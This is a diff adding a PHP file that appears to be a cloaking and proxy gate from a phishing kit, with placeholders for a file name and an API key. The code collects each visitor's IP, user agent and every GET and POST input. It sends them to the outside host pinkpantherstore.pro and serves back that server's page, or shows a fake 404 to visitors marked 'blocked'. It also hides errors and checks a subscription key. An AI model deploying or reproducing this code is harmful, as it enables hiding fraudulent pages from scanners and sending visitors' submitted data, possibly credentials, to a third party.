@@ -1,0 +1,502 @@
+<?php
+
+define("FILE","$$file_php$$");
+
+class Autoloader
+{
+    private $root_dir;
+
+    public function __construct($root_dir = __DIR__)
+    {
+        $this->root_dir = rtrim($root_dir, DIRECTORY_SEPARATOR);
+        spl_autoload_register([$this, 'autoLoad']);
+    }
+
+    private function autoLoad($class_name)
+    {
+        $path = str_replace("\\", DIRECTORY_SEPARATOR, $class_name);
+        $path = $this->root_dir . DIRECTORY_SEPARATOR . ltrim($path, DIRECTORY_SEPARATOR) . '.php';
+        require_once $path;
+    }
+}
+
+
+class Generic
+{
+    public static function dir_creator($dir_path)
+    {
+        return is_dir($dir_path) || mkdir($dir_path, 0777, true);
+    }
+
+    public static function createFile($file_path){
+        return is_file($file_path) || Generic::dir_creator(dirname($file_path)) && touch($file_path);
+    }
+
+    public static function getOS($user_agent) {
+        $os_platform  = "undefined";
+
+        $os_array     = array(
+            '/windows nt 10/i'      =>  'Windows 10',
+            '/windows nt 6.3/i'     =>  'Windows 8.1',
+            '/windows nt 6.2/i'     =>  'Windows 8',
+            '/windows nt 6.1/i'     =>  'Windows 7',
+            '/windows nt 6.0/i'     =>  'Windows Vista',
+            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
+            '/windows nt 5.1/i'     =>  'Windows XP',
+            '/windows xp/i'         =>  'Windows XP',
+            '/windows nt 5.0/i'     =>  'Windows 2000',
+            '/windows me/i'         =>  'Windows ME',
+            '/win98/i'              =>  'Windows 98',
+            '/win95/i'              =>  'Windows 95',
+            '/win16/i'              =>  'Windows 3.11',
+            '/macintosh|mac os x/i' =>  'Mac OS X',
+            '/mac_powerpc/i'        =>  'Mac OS 9',
+            '/linux/i'              =>  'Linux',
+            '/ubuntu/i'             =>  'Ubuntu',
+            '/iphone/i'             =>  'iPhone',
+            '/ipod/i'               =>  'iPod',
+            '/ipad/i'               =>  'iPad',
+            '/android/i'            =>  'Android',
+            '/blackberry/i'         =>  'BlackBerry',
+            '/webos/i'              =>  'Mobile'
+        );
+
+        foreach ($os_array as $regex => $value)
+            if (preg_match($regex, $user_agent)) {
+                $os_platform = $value;
+                break;
+            }
+
+        return $os_platform;
+    }
+
+    public static function getBrowser($user_agent){
+        $browser        = "undefined";
+
+        $browser_array = array(
+            '/msie/i'      => 'Internet Explorer',
+            '/firefox/i'   => 'Firefox',
+            '/safari/i'    => 'Safari',
+            '/chrome/i'    => 'Chrome',
+            '/edge/i'      => 'Edge',
+            '/opera/i'     => 'Opera',
+            '/netscape/i'  => 'Netscape',
+            '/maxthon/i'   => 'Maxthon',
+            '/konqueror/i' => 'Konqueror',
+            '/mobile/i'    => 'Handheld Browser'
+        );
+
+        foreach ($browser_array as $regex => $value)
+            if (preg_match($regex, $user_agent)) {
+                $browser = $value;
+                break;
+            }
+
+        return $browser;
+    }
+
+    public static function implodeArray($sep, $array){
+        $text = '';
+        foreach($array as $key => $value){
+            if (is_array($value))
+                $text .= "{$key}: {" . Generic::implodeArray(",", $value) . "}{$sep}";
+            else
+                $text .= "{$key}: {$value}{$sep}";
+        }
+        return $text;
+    }
+
+    public static function getIp(){
+        if (isset($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
+        else if (isset($_SERVER['HTTP_X_REAL_IP'])) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
+        else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
+        else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
+        else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
+        else if (isset($_SERVER['HTTP_FORWARDED'])) $ipaddress = $_SERVER['HTTP_FORWARDED'];
+        else if (isset($_SERVER['REMOTE_ADDR'])) $ipaddress = $_SERVER['REMOTE_ADDR'];
+        else $ipaddress = false;
+        if ($ipaddress == "::1") {
+            return "127.0.0.1";
+        }
+        return $ipaddress;
+    }
+
+    public static function fetchGithubContent($url)
+    {
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ],
+            'http' => [
+                'method' => "GET"
+            ]
+        ]);
+
+        $content = @file_get_contents($url, false, $context);
+        if ($context)
+            return trim($content, "/ \t\n\r\0\x0B");
+        return False;
+    }
+}
+
+
+class Logger
+{
+    private $log_dir;
+    const FILES = [
+        'exceptions_file' => 'Exceptions.log',
+        'errors_file' => 'Errors.log',
+        'status_file' => 'Status.log',
+        'active_file' => 'Active.log'
+    ];
+
+    /**
+     * @throws Exception
+     */
+
+    public function __construct($log_dir = null){
+        $this->log_dir = __DIR__  .DIRECTORY_SEPARATOR. "logs";
+        $this->filesCreator();
+        $this->setPhpLoggers();
+    }
+
+    /**
+     * @throws Exception
+     */
+    private function filesCreator(){
+        foreach(self::FILES as $file){
+            if (!Generic::createFile($this->log_dir . DIRECTORY_SEPARATOR . $file))
+                throw new Exception('[-] Unable to create file ' . $file);
+        }
+        file_put_contents($this->log_dir . DIRECTORY_SEPARATOR . "index.php", trim("
+            <?php\r\n\thttp_response_code(404);\r\n\techo 'you seems to be lost';\r\n\texit(404);"));
+        return true;
+    }
+
+    private function errorLogger($error_no, $error_, $filename = "", $lineno = "", $context=[]){
+        $message = "[" . strftime("%F %r") . "] an error occurred in {$filename}:{$lineno}";
+        $message .= "\n\t error: {$error_}";
+        $message .= "\n\t error_no: {$error_no}\n";
+        error_log($message, 3, $this->log_dir . DIRECTORY_SEPARATOR . self::FILES['errors_file']);
+    }
+
+    private function exceptionLogger($exception){
+        $message = "[" . strftime("%F %r") . "] an unhandled exception occurred in {$exception->getFile()}:{$exception->getLine()}";
+        $message .= "\n\t error: {$exception->getMessage()}";
+        $message .= "\n\t error_code: {$exception->getCode()}\n";
+        error_log($message, 3, $this->log_dir . DIRECTORY_SEPARATOR . self::FILES['exceptions_file']);
+    }
+
+    public function activeLogger($data){
+        $data = str_replace("\n", "\n\t\t", $data);
+        $message = "[" . strftime("%F %r") . "]";
+        $message .= "\n\t message: {$data}\n";
+        return file_put_contents($this->log_dir . DIRECTORY_SEPARATOR . self::FILES['active_file'], $message, FILE_APPEND);
+    }
+
+    public function statusLogger($data){
+        $data = str_replace("\n", "\n\t\t", $data);
+        $message = "[" . strftime("%F %r") . "]";
+        $message .= "\n\t message: {$data}\n";
+        return file_put_contents($this->log_dir . DIRECTORY_SEPARATOR . self::FILES['status_file'], $message, FILE_APPEND);
+
+    }
+
+    private function setPhpLoggers(){
+        ini_set('display_errors', false);
+        error_reporting(E_ERROR);
+        ini_set('log_errors', true);
+        ini_set('ignore_repeated_errors', true);
+        ini_set('ignore_user_abort', true);
+        ini_set('log_errors', $this->log_dir . DIRECTORY_SEPARATOR . self::FILES['errors_file']);
+        set_error_handler([$this, 'errorLogger']);
+        set_exception_handler([$this, 'exceptionLogger']);
+        set_time_limit(0);
+    }
+}
+
+class Session
+{
+    private $_encrypted_session_id;
+
+    public function  __construct(){
+        session_start();
+        $this->setSessionEncryption();
+        $this->sessionHandler();
+        $this->encryptedSessionId();
+    }
+
+    public function encrypted_session_id(){
+        return $this->_encrypted_session_id;
+    }
+
+    public function verifySessionId($encrypted_session_id){
+        if (!$encrypted_session_id)
+            return false;
+        return session_id() == $this->sessionDecryptor($encrypted_session_id);
+    }
+
+    public function sessionEncryptor($data){
+        if (!$data)
+            return "";
+        return base64_encode(openssl_encrypt($data,$_SESSION['encryption_method'], $_SESSION['encryption_keys']['private_key'], 0, hex2bin($_SESSION['encryption_keys']['iv_key'])));
+    }
+
+    public function sessionDecryptor($data){
+        if (!$data)
+            return "";
+        return openssl_decrypt(base64_decode($data),$_SESSION['encryption_method'], $_SESSION['encryption_keys']['private_key'], 0, hex2bin($_SESSION['encryption_keys']['iv_key']));
+    }
+
+    private function setSessionEncryption() {
+        if (!isset($_SESSION['encryption_keys'], $_SESSION['encryption_method'])) {
+            $cipher = "AES-256-CBC";
+            $private_key = bin2hex(openssl_random_pseudo_bytes(openssl_cipher_iv_length($cipher)));
+            $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($cipher));
+            $_SESSION['encryption_keys'] = [
+                'private_key' => $private_key,
+                'iv_key' => bin2hex($iv)
+            ];
+            $_SESSION['encryption_method'] = $cipher;
+        }
+    }
+
+    private function encryptedSessionId(){
+        $this->_encrypted_session_id = $this->sessionEncryptor(session_id());
+    }
+
+    private function sessionHandler()
+    {
+        if (!isset($_SESSION['login_time']))
+            $this->set();
+
+        if (isset($_SESSION['login_time']) && time() - $_SESSION['login_time'] > 1800) {
+            $this->destroy();
+            echo "session has been ended. please refer to the message to regenerate the session.";
+            exit(0);
+        }
+    }
+
+    private function set(){
+        $_SESSION['login_time'] = time();
+        $_SESSION['cookies'] = [];
+    }
+
+    private function destroy(){
+        session_destroy();
+        http_response_code(302);
+        header("Location: {$_SERVER['PHP_SELF']}");
+        exit(302);
+    }
+}
+
+class ResponseHandler
+{
+    private $json_response = null;
+    private $raw = null;
+    public function handle($response){
+        if($response && $response['status']){
+            return ($this->json_response = json_decode($response['response'], true)?: $this->raw = $response['response']);
+        }
+        return null;
+    }
+
+    public function rawResponse(){
+        return $this->raw;
+    }
+
+    public function jsonResponse(){
+        return $this->json_response;
+    }
+}
+
+
+class RequestHandler
+{
+    private $logger, $session, $response;
+
+    public function __construct()
+    {
+        $this->logger = new Logger();
+        $this->session = new Session();
+        $this->response = new ResponseHandler();
+    }
+
+    public function sendRequest($url, $data = null,  $cookies = []){
+        $this->logger->statusLogger("Trying to set curl options.");
+
+        $handler = curl_init();
+        $reply = [
+            'status' => true,
+            'errors' => [],
+        ];
+
+        curl_setopt($handler, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($handler, CURLOPT_POST, true);
+        curl_setopt($handler, CURLOPT_HEADERFUNCTION, function($handler, $headerLine){
+            if (preg_match('/set-cookie:\s*(.*)\s*=\s*(.[^;]*)/mi', $headerLine, $cookie) == 1) {
+                if (count($cookie) === 3)
+                    $_SESSION['cookies'][$cookie[1]] = $cookie[2];
+            }
+            return strlen($headerLine);
+        });
+        curl_setopt($handler, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($handler, CURLOPT_SSL_VERIFYHOST, false);
+        curl_setopt($handler, CURLOPT_URL, $url);
+        curl_setopt($handler, CURLOPT_POSTFIELDS, (is_array($data) ? http_build_query($data) : $data));
+
+
+
+        $this->logger->statusLogger('trying to set session cookies.');
+        $cookies = array_merge($cookies, isset($_SESSION['cookies']) ? $_SESSION['cookies'] : []);
+        if ($cookies){
+            curl_setopt($handler, CURLOPT_COOKIESESSION, true);
+            foreach ($cookies as $cookie_name => $cookie_value){
+                $cookie_name = trim($cookie_name);
+                $cookie_value = trim($cookie_value);
+                $cookie = "{$cookie_name}={$cookie_value}";
+                curl_setopt($handler, CURLOPT_COOKIE, $cookie);
+            }
+        }
+
+        $this->logger->statusLogger("trying to send the request.");
+        $result = curl_exec($handler);
+        if(curl_errno($handler)) {
+            $reply['status'] = false;
+            $reply['errors'][] = ['error' => curl_errno($handler), 'error_no' => curl_error($handler) ];
+        }
+        $reply['response'] = $result;
+        $this->logger->statusLogger("the request has been sent.\n\t [+] response: {$result}");
+        curl_close($handler);
+        return $reply;
+    }
+
+    public function handle($server_url, $request_message){
+        if (!isset($_GET['auth_token'], $_GET['time_token'])){
+            http_response_code(302);
+            $encrypted_session_id = urlencode($this->session->encrypted_session_id());
+            $encrypted_time = urlencode($this->session->sessionEncryptor(time()));
+            header("Location: {$_SERVER['PHP_SELF']}?auth_token={$encrypted_session_id}&time_token={$encrypted_time}");
+            exit(302);
+        }
+
+        if ($this->session->verifySessionId(urldecode($_GET['auth_token']))){
+            $client_info = Generic::implodeArray("\n\t ", $request_message['client_info']);
+            $message = "A new user logged in\n\t {$client_info}";
+            $this->logger->activeLogger($message);
+            $request_message['customer_info']['is_authentication'] = false;
+            $this->response->handle($this->sendRequest($server_url, $request_message));
+            if ($this->response->jsonResponse() && !$this->response->jsonResponse()['blocked'])
+                echo $this->response->jsonResponse()['response'];
+            else
+                $this->redirectBlocked();
+            exit(0);
+        }
+        $this->redirectBlocked();
+    }
+
+    private function redirectBlocked(){
+//        http_response_code(302);
+//        header("Location: https://www.google.com");
+//        exit(0);
+    }
+}
+
+
+class Authenticator
+{
+    private $request, $message, $server_url, $response;
+    private $logger;
+
+    public function __construct($server_url, $message){
+        $this->logger = new Logger();
+        $this->request = new RequestHandler();
+        $this->response = new ResponseHandler();
+        $this->message = $message;
+        $this->server_url = $server_url;
+        $this->sendAuthenticationRequest();
+    }
+
+    private function sendAuthenticationRequest(){
+        $this->logger->statusLogger("Trying to authenticate with the server.");
+        $this->message['customer_info']['is_authentication'] = true;
+        $authentication_response = $this->request->sendRequest($this->server_url, $this->message);
+        $this->response->handle($authentication_response);
+        $this->logger->statusLogger("Server authentication request has been retrieved.");
+    }
+
+    public function authenticate(){
+        return ($this->response->jsonResponse() ? $this->response->jsonResponse()['authenticated'] : false);
+    }
+
+    public function isBlocked(){
+        return ($this->response->jsonResponse() ? $this->response->jsonResponse()['blocked']: true);
+    }
+
+
+}
+
+class Config
+{
+    private $server_url,$api_key;
+    private $authenticator, $request, $message;
+
+    public function __construct($server_url,$api_key){
+        if (strpos($server_url, "raw.githubusercontent.com", 0) !== false)
+        $this->$server_url = Generic::fetchGithubContent($server_url);
+        $autoloader = new Autoloader();
+        $logger = new Logger();
+        $session = new Session();
+        $this->request = new RequestHandler();
+        $this->server_url = $server_url;
+        $this->api_key = $api_key;
+        $this->message = $this->createMessage();
+        $this->authenticator = new Authenticator($server_url, $this->message);
+        $this->run();
+    }
+
+    private function run(){
+
+        if (!$this->authenticator->authenticate()){
+            http_response_code(403);
+            $ip_server = $_SERVER['SERVER_ADDR'];
+            echo "Api Worng or Your subscription has expired" . " or Server Ip address not at Your settings Pleas Add this server IP in your Settings : " . $ip_server ;
+            exit(0);
+        }
+
+        if ($this->authenticator->isBlocked()){
+            header("HTTP/1.0 404 Not Found");
+            echo "<h1>404 Not Found</h1>";
+            echo "<p>The page you are looking for could not be found.</p>";
+            exit(0);
+        }
+
+        $this->request->handle($this->server_url, $this->message);
+    }
+
+    private function createMessage(){
+        return array(
+            'customer_info' => array(
+                'api_key' => $this->api_key,
+            ),
+            'client_info' => array(
+                'ip' => Generic::getIp(),
+                'useragent' => $_SERVER['HTTP_USER_AGENT'],
+                'method' => $_SERVER['REQUEST_METHOD'],
+                'request_time' => time(),
+                'apis' => $this->api_key,
+                'inputs' => array(
+                    'get' => $_GET,
+                    'post' => $_POST
+                )
+            )
+        );
+    }
+}
+
+
+$server_url = "https://pinkpantherstore.pro/" . FILE;
+$api_key = "$$api_key$$";
+
+$config = new Config($server_url,$api_key);
